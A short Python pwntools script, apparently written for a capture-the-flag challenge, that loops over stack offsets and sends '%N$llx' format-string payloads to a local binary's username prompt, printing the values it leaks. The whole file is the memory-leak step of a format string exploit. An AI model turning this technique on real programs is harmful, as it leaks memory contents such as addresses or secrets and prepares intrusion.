from pwn import *

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF("./chal", checksec=False)

context.log_level = 'warn'

# Let's fuzz X values
for i in range(0, 50):
    try:
        p = elf.process()
        p.recvuntil(b"Username: ")
        p.sendline("%{}$llx".format(i).encode())
        
        res = p.recvuntil(b"@cool",drop =True).decode()
        if res:
            print(f"Found at {i}: ", end="")
            print(res.strip())
        
        p.close()
    except:
        pass